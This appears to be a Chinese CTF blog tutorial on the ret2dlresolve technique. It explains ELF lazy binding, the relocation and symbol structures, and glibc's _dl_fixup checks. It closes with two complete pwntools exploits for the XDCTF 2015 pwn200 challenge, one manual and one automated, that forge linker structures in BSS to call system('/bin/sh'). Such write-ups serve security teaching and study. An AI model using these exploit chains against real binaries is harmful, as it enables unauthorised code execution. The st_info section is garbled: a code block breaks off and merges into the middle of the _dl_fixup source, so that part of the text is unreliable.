---
title: "ret2dlresolve 利用技术"
date: 2025-06-20
categories:
  - 二进制安全
  - ROP
tags:
  - pwn
  - ret2dlresolve
---

当不能泄露libc时。我们可以通过retdlresolve这种方法来伪造动态链接器。控制程序的执行流程。

主要是延迟绑定中的re_dlresolve函数


在 **Ret2dlresolve** 攻击中，你的目的是让链接器帮你解析一个**原本不存在于导入表中的函数**（比如 `system`），或者你想劫持解析过程。因为 `.rel.plt` 没法写，所以你必须：

1. 在可写的区域（如 BSS 段）**伪造**一个重定位表项（即 `fake_reloc`）。
2. 告诉链接器去这里读数据，而不是去正常的 `.rel.plt` 读。
3. 我们需要构造出完整的流程


> 延迟绑定：当程序第一次调用一个动态链接的函数时，会通过 PLT (Procedure Linkage Table) 和 GOT (Global Offset Table) 来完成函数地址的解析。这个过程涉及到 _dl_runtime_resolve 函数的调用。
>

1. **_dl_fixup 函数**：__dl_runtime_resolve_ 实际上调用了 __dl_fixup_ 函数，该函数在 glibc 中实现，用于解析符号并更新 GOT 表。
2. **RELRO 类型**：根据程序的 RELRO (Relocation Read-Only) 类型，攻击者需要采取不同的策略。NO RELRO 时，_.dynamic_ 节是可写的，可以直接修改；Partial RELRO 时，_.dynamic_ 节是只读的，但 _.rel.plt_ 节是可写的，需要通过栈迁移等技术来伪造数据结构。
3. **攻击实践**：攻击者需要伪造 _.rel.plt_、_.dynsym_ 和 _.dynstr_ 节中的数据结构，然后通过控制 _reloc_arg_ 和 _link_map_ 来调用 __dl_runtime_resolve_ 函数，最终实现调用 _system("/bin/sh")_ 来获取 shell。

**.rel.plt**节是用于函数重定位，**.rel.dyn**是用于变量重定位


## _dl_fixup函数
传入的两个参数。一个是rdi寄存器中存储的link_map，rsi是GOT表中关于PLT重定位的索引值，后面要根据该索引值写入新的地址。

就是用于解析导入函数的真实地址，并改写GOT


"**当程序导入函数时，动态链接器在**`**.dynstr**`**段中添加一个函数名称字符串**  
**在**`**.dynsym**`**段中添加一个指向函数名称字符串的**`**Elf Sym**`**结构体**  
**在**`**.rel.plt**`**段中添加一个指向**`**Elf Sym**`**的**`**Elf Rel**`**结构体**  
**最后**`**Elf Rel**`**的**`**r_offse**`**构成GOT表，保存在**`**.got.plt**`**段中**"


## 重定位rel表
 动态链接器的“待办事项清单”，它告诉链接器：“请算出某某函数的真实地址，然后填到某某地方去”。  

1. `**r_info**` 是一个**压缩数据**。在 32 位 ELF 中，为了节省空间，它把“找哪个符号”和“怎么处理”这两个信息，压到了同一个 32 位整数里。所以它有两部分
    - **高 24 位**：存放符号表索引 (`r_sym`)。
    - **低 8 位**：存放重定位类型 (`r_type`)。

---

### 1. 什么是 Rel 表 (`.rel.plt`)？
在程序编译时，编译器不知道 `system`、`read` 这些动态库函数的真实地址（因为它们在 libc.so 里，且地址随机）。

所以，编译器在程序里留了一张表，叫做 **重定位表 (**`**Elf32_Rel**`**)**。这就好比是一张**填空题试卷**：

+ **题目 1**：请计算 `read` 函数的真实地址，填入 `0x804a010` (read_got)。
+ **题目 2**：请计算 `write` 函数的真实地址，填入 `0x804a014` (write_got)。

动态链接器 (`_dl_runtime_resolve`) 运行时的核心工作就是：**读取这张表，做完题目，填好空。**

这张表里的每一项（每一道题）结构如下：

```c
typedef struct {
    Elf32_Addr r_offset;  // 填空的位置 (比如 write_got 的地址)
    Elf32_Word r_info;    // 题目信息 (包含：找谁？怎么填？)
} Elf32_Rel;
```

---

### 2. `r_info` 的位操作
r_info 是一个 Elf32_Word (32位无符号整数，4字节)。它的高24位和低八位又再分

分别为r_sym和r_type

它虽然只是一个整数，但 ELF 规范 (Specification) 规定了它的比特位分布：

| **Bit 31 ........................ Bit 8** | **Bit 7 .......... Bit 0** |
| --- | --- |
| **ELF32_R_SYM (符号索引)** | **ELF32_R_TYPE (类型)** |
| **高 24 位** | **低 8 位** |


#### 为什么要这么分？
+ `**r_type**`：重定位类型（比如 `R_386_JUMP_SLOT` 固定是 `0x7`）。它只需要很少的几种类型，**8 个比特** (0-255) 足够了。
+ `**r_sym**`：符号表索引。一个程序可能会导入成千上万个函数，所以需要更大的空间，**24 个比特** (可以支持 1600万个符号) 留给它。

然后我们如果要伪造对应的rel表。对应这一块要把r_sym、r_type、r_offset设置成要换的函数

r_info通过拼接得到。


然后有了rel表以后我们介绍ELF符号表

## ELF表和sym结构体
ELF符号表好像有很多东西。不过32位的时候我们只需要伪造里面的sym结构体（ELF32_sym）就行

简单来说，`**Sym**`** 表就是函数的“身份证”**。 链接器拿到 `Rel` 表（工单）后，会根据索引找到这张 `Sym` 表（身份证），通过身份证上的信息确认：“哦，原来你要找的函数叫 `system`，它是个全局函数。”

---

### 1. `Elf32_Sym` 结构体标准定义 (16字节)
在 C 语言中，它的定义是这样的：

```c
typedef struct {
    Elf32_Word    st_name;  // 4字节: 名字在哪里？(字符串表的偏移)
    Elf32_Addr    st_value; // 4字节: 函数地址 (导入函数填0)
    Elf32_Word    st_size;  // 4字节: 函数大小 (导入函数填0)
    unsigned char st_info;  // 1字节: 属性 (类型+绑定)
    unsigned char st_other; // 1字节: 可见性 (0)
    Elf32_Half    st_shndx; // 2字节: 归属段 (0)
} Elf32_Sym;
```


### 下面介绍`st_name` 的具体工作原理
   可以了解一下偶然看到的

   ELF 文件为了节省空间，不会把函数名（如 `"system"`, `"printf"`, `"write"`）直接写在 Symbol 结构体里。相反，它把所有字符串连在一起，放在一个叫 `**.dynstr**`** (Dynamic String Table)** 的区域里。

`**st_name**`** 存的就是相对于 **`**.dynstr**`** 起始地址的偏移量。**

****

**ok那么我们伪造了一个** sym结构体的话，如果你想让它里面代表 `**write**` 函数：

对于st_name就应该

1. **你需要算出 **`**"write"**`** 字符串相对于 **`**.dynstr**`** 开头的距离。**
2. **距离 = **`**0x08048206**`** - **`**0x08048200**`** = **`**6**`**。**
3. **所以，你的 **`**fake_sym.st_name**`** 必须填入 **`**6**`**。**

**链接器看到 **`**st_name = 6**`**，就会做如下计算：**

**函数名地址 = **`**.dynstr**`**基地址 + **`**6**`** = 指向 "write"**


### st_value  st_size（值与大小）
#### st_value
+ **类型**：`Elf32_Addr` (地址)

**标准含义**：

+ **如果是已定义的函数**：这里存的是函数在内存中的**虚拟地址**（或者在文件中的偏移）。
+ **如果是未定义的函数（导入函数）**：这里通常为 **0**。

**在攻击中的设置**：`**0**`

+ **原因**：我们伪造这个符号是为了让链接器去 libc 里找 `system`，而不是我们在程序里自己写了一个 `system`。既然是“去外面找”，那我们手头就没有它的地址，留空（0）即可。链接器解析完成后，会把找到的真地址填到 GOT 表里，而不是改写这里。


#### st_size
+ **类型**：`Elf32_Word` (整数)

**  标准含义**：

+ 该符号占用多少字节的内存。比如一个函数有 100 行汇编，可能大小就是 200 字节。
+ **在攻击中的设置**：`**0**`
+ **原因**：动态链接器在解析函数地址时，只关心“函数在哪里（起始地址）”，根本不关心“函数有多长”。填 0 是最省事且安全的做法。


```python
p32(0) + p32(0)
```


## st_info
与我们的重定位表类似。这里它也有两部分

```c
st_bind = 0x1
st_type = 0x2
st_info = (st_bind r_info)];

    void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
    lookup_t result;
    DL_FIXUP_VALUE_TYPE value;

    // 检查r_info的最低位是不是7
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT); 

    // 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码
    if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) 
    {
        const struct r_found_version *version = NULL;

        // 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码
        if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
            /* 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff的过程中，
			由于我们一般伪造的symtab位于bss段，就导致在64位下reloc->r_info比较大,故程序会发生错误。所以要使程序不发生错误，
			自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段：

			第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。
			第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。*/
            const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }

        int flags = DL_LOOKUP_ADD_DEPENDENCY;
        if (!RTLD_SINGLE_THREAD_P)
        {
            THREAD_GSCOPE_SET_FLAG ();
            flags |= DL_LOOKUP_GSCOPE_LOCK;
        }

        RTLD_ENABLE_FOREIGN_CALL;

        // 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym->st_name找到符号表字符串，result为libc基地址
        result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

        if (!RTLD_SINGLE_THREAD_P)
            THREAD_GSCOPE_RESET_FLAG ();

        RTLD_FINALIZE_FOREIGN_CALL;

        // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value
        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    }
    else
    {
        // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l->l_addr + st_value,我们的目的是使**value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value
        /* We already found the symbol.  The module (and therefore its load
     address) is also known.  */
        value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
        result = l;
    }

    /* And now perhaps the relocation addend.  */
    value = elf_machine_plt_value (l, reloc, value);

    if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

    /* Finally, fix up the plt itself.  */
    if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
  // 最后把value写入相应的GOT表条目中
  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}

```


# XDCTF 2015 pwn200（32位）
这道题用了偷梁换柱的方法。原来要解析write函数。我们换成system


```python
from pwn import *

# context.log_level = 'debug'

elf = ELF('./pwn200')
# io = remote('127.0.0.1', 10001)
io = process('./pwn200')
io.recv()

pppr_addr      = 0x08048619     # pop esi ; pop edi ; pop ebp ; ret
pop_ebp_addr   = 0x0804861b     # pop ebp ; ret
leave_ret_addr = 0x08048458 #: leave ; ret

write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt  = elf.plt['read']

plt_0    = elf.get_section_by_name('.plt').header.sh_addr        # 0x80483e0
rel_plt  = elf.get_section_by_name('.rel.plt').header.sh_addr    # 0x8048390
dynsym   = elf.get_section_by_name('.dynsym').header.sh_addr     # 0x80481cc
dynstr   = elf.get_section_by_name('.dynstr').header.sh_addr     # 0x804828c
bss_addr = elf.get_section_by_name('.bss').header.sh_addr        # 0x804a028

base_addr = bss_addr + 0x600   

payload_1  = b"A" * 112
payload_1 += p32(read_plt)
payload_1 += p32(pppr_addr)
payload_1 += p32(0)
payload_1 += p32(base_addr)
payload_1 += p32(100)
payload_1 += p32(pop_ebp_addr)
payload_1 += p32(base_addr)
payload_1 += p32(leave_ret_addr)
io.send(payload_1)
'''
上面是在打开一些需要用的地址。然后分配好在bss上迁移的空间。利用程序里的溢出把控制流弄到bss
进行栈迁移。在bss上伪造我们的表
'''

reloc_index = base_addr + 28 - rel_plt      
#我们这里计算地址的时候也是用的基准+偏移的方式。＋0x28在下面的payload里

fake_sym_addr = base_addr + 36

align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align       # 对齐

# fake Elf Rel
r_sym = (fake_sym_addr - dynsym) / 0x10
r_type = 0x7
r_info = (int(r_sym) << 8) + (r_type & 0xff)
fake_reloc = p32(write_got) + p32(r_info)

# fake Elf Sym
st_name = fake_sym_addr + 0x10 - dynstr
st_bind = 0x1
st_type = 0x2
st_info = (st_bind << 4) + (st_type & 0xf)
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)

payload_7 = b"AAAA"                  #0x4
payload_7 += p32(plt_0)              #0x8
payload_7 += p32(reloc_index)        #0x12
payload_7 += b"AAAA"                 #0x16
payload_7 += p32(base_addr + 80)     #0x20
payload_7 += b"AAAA"                 #0x24
payload_7 += b"AAAA"                 #0x28
payload_7 += fake_reloc
payload_7 += b"A" * align
payload_7 += fake_sym
payload_7 += b"system\x00"
payload_7 += b"A" * (80 - len(payload_7))
payload_7 += b"/bin/sh\x00"
payload_7 += b"A" * (100 - len(payload_7))
io.sendline(payload_7)
io.interactive()

```


自动化构造：

```python
from pwn import *

context.binary = elf = ELF("./pwn200")
context.arch='i386'
context.log_level ='debug'

rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io = process("./pwn200")
io.recvuntil("\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()

```